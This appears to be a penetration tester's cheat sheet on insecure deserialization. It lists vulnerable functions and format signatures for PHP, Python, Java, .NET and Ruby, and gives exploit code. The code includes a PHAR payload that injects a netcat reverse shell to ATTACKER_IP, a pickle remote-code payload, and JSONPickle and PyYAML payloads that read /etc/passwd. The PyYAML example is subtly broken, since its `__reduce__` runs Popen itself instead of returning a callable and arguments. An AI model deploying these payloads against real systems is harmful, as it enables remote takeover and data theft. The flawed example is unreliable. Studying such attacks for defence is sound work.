# Deserialization
## WB functions
- `unserialize()` - PHP
- `pickle.loads()` - Python Pickle
- `jsonpickle.decode()` - Python JSONPickle
- `yaml.load()` - Python PyYAML / ruamel.yaml
- `readObject()` - Java
- `Deserialize()` - C# / .NET
- `Marshal.load()` - Ruby

## BB serialized values
- If it looks like: `a:4:{i:0;s:4:"Test";i:1;s:4:"Data";i:2;a:1:{i:0;i:4;}i:3;s:7:"ACADEMY";}` - **PHP**
- If it looks like: `(lp0\nS'Test'\np1\naS'Data'\np2\na(lp3\nI4\naaS'ACADEMY'\np4\na.` - **Pickle Protocol 0**, default for Python 2.x
- Bytes starting with `80 01` (Hex) and ending with `.` - **Pickle Protocol 1, Python 2.x**
- Bytes starting with `80 02` (Hex) and ending with `.` - **Pickle Protocol 2, Python 2.3+**
- Bytes starting with `80 03` (Hex) and ending with `.` - **Pickle Protocol 3, default for Python 3.0-3.7**
- Bytes starting with `80 04 95` (Hex) and ending with `.` - **Pickle Protocol 4, default for Python 3.8+**
- Bytes starting with `80 05 95` (Hex) and ending with `.` - **Pickle Protocol 5, Python 3.x**
- `["Test", "Data", [4], "ACADEMY"]` - **JSONPickle, Python 2.7 / 3.6+**
- `- Test\n- Data\n- - 4\n- ACADEMY\n` - **PyYAML / ruamel.yaml, Python 3.6+**
- Bytes starting with `AC ED 00 05 73 72` (Hex) or `rO0ABXNy` (Base64) - **Java**
- Bytes starting with `00 01 00 00 00 ff ff ff ff` (Hex) or `AAEAAAD/////` (Base64) - **C# / .NET**
- Bytes starting with `04 08` (Hex) - **Ruby**

## PHAR Deserialization
> According to the [PHP documentation](https://www.php.net/manual/en/intro.phar.php), metadata can be any PHP variable that can be serialized. In PHP versions until **8.0**, PHP will automatically deserialize metadata when parsing a PHAR file. Parsing a PHAR file means any time a file operation is called in PHP with the `phar://` wrapper. So even calls to functions like `file_exists` and `file_get_contents` will result in PHP deserializing PHAR metadata.

### Exploit example
```php
<?php
include('UserSettings.php');

$phar = new Phar("exploit.phar");

$phar->startBuffering();

$phar->addFromString('0', '');
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$phar->setMetadata(new \App\Helpers\UserSettings('"; nc -nv <ATTACKER_IP> 9999 -e /bin/bash;#', 'attacker@htbank.com', '$2y$10$u5o6u2EbjOmobQjVtu87QO8ZwQsDd2zzoqjwS0.5zuPr3hqk9wfda', 'default.jpg'));

$phar->stopBuffering();
```

## Tools
- [PHPGCC](https://github.com/ambionics/phpggc) (**PHP**)
- [PEAS](https://github.com/j0lt-github/python-deserialization-attack-payload-generator) (**Python**)

## Python Deserialization
Reading about `object.__reduce__()`, we see that it returns a tuple that contains:

- A callable object that will be called to create the initial version of the object.
- A tuple of arguments for the callable object.

> What this means exactly is that when a pickled object is unpickled, if the pickled object contains a definition for `__reduce__`, it will be used to restore the original object. We can abuse this by returning a callable object with parameters that result in command execution.

In this case, we want to execute `os.system("ping -c 5 <ATTACKER_IP>")`, just to check if the command execution works. This means we will need to define `__reduce__` so it returns `os.system` as the callable object and `"ping -c 5 <ATTACKER_IP>"` as the argument. Since `__reduce__` requires a tuple of arguments we will use `("ping -c 5 <ATTACKER_IP>",)`. We create a new file named exploit-rce.py with the following contents:
```python
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        return os.system, ("ping -c 5 <ATTACKER_IP>",)

r = RCE()
p = pickle.dumps(r)
b = base64.b64encode(p)
print(b.decode())
```

### JSONPickle deserialize
```python
import jsonpickle
import os

class RCE():
  def __reduce__(self):
    return os.system, ("head /etc/passwd",)

# Serialize (generate payload)
exploit = jsonpickle.encode(RCE())
print(exploit)

# Deserialize (vulnerable code)
jsonpickle.decode(exploit)
```

### YAML (PyYAML, ruamel.yaml)
```python
import yaml
import subprocess

class RCE():
  def __reduce__(self):
    return subprocess.Popen(["head", "/etc/passwd"])

# Serialize (Create the payload)
exploit = yaml.dump(RCE())
print(exploit)

# Deserialize (vulnerable code)
yaml.load(exploit)
```

## .NET
### (Potentially) Vulnerable Functions
|Serializer|Example|Reference|
|--|--|--|
|BinaryFormatter|`.Deserialize(...)`|[Microsoft](https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.formatters.binary.binaryformatter?view=net-7.0)|
|fastJSON|`JSON.ToObject(...)`|[Github](https://github.com/mgholam/fastJSON)|
|JavaScriptSerializer|`.Deserialize(...)`|[Micosoft](https://learn.microsoft.com/en-us/dotnet/api/system.web.script.serialization.javascriptserializer?view=netframework-4.8.1)|
|Json.NET|`JsonConvert.DeserializeObject(...)`|[Newtonsoft](https://www.newtonsoft.com/json)|
|LosFormatter|`.Deserialize(...)`|[Microsoft](https://learn.microsoft.com/en-us/dotnet/api/system.web.ui.losformatter?view=netframework-4.8.1)|
|NetDataContractSerializer|`.ReadObject(...)`|[Microsoft](https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.netdatacontractserializer?view=netframework-4.8.1)|
|ObjectStateFormatter|`.Deserialize(...)`|[Microsoft](https://learn.microsoft.com/en-us/dotnet/api/system.web.ui.objectstateformatter?view=netframework-4.8.1)|
|SoapFormatter|`.Deserialize(...)`|[Microsoft](https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.formatters.soap.soapformatter?view=netframework-4.8.1)|
|XmlSerializer|`.Deserialize(...)`|[Microsoft](https://learn.microsoft.com/en-us/dotnet/api/system.xml.serialization.xmlserializer?view=net-7.0)|
|YamlDotNet|`.Deserialize<...>(...)`|[Github](https://github.com/aaubry/YamlDotNet)|

### BB patterns
- Base64-encoded strings beginning with `AAEAAAD/////`
- Strings containing `$type`
- Strings containing `__type`
- Strings containing `TypeObject`